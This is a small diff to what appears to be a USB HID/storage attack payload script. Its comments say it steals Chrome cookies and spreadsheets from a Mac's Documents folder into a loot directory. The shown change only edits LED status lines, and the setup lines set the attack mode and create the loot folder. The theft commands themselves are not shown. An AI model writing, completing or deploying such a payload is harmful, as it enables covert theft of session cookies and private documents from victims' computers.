@@ -7,12 +7,13 @@
 # Steaks cookies from chrome and documents from the documents folder (spreadsheets)
 # then stashes them in /root/udisk/loot/MacLoot
 #
+# Amber..............Executing payload
 # Red................Failed to get spreadsheets
 # Purple.............Got some spreadsheets
 # Green..............Finished
 #
 
-LED R
+LED G R
 ATTACKMODE HID STORAGE
 LOOTDIR=/root/udisk/loot/MacLoot
 mkdir -p $LOOTDIR
